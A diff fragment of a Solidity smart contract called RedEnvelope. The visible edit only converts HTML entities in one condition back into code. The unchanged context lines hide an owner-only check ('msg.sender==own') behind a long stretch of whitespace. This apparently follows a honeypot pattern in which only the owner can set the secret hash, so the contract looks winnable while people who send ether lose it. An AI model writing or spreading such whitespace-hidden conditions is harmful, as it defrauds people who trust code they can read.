@@ -19,7 +19,7 @@ contract RedEnvelope
     public
     payable
     {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==own){
-        if(!closed&amp;&amp;(msg.value &gt; 1 ether))
+        if(!closed&&(msg.value > 1 ether))
         {
             hashPass = hash;
         }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               }
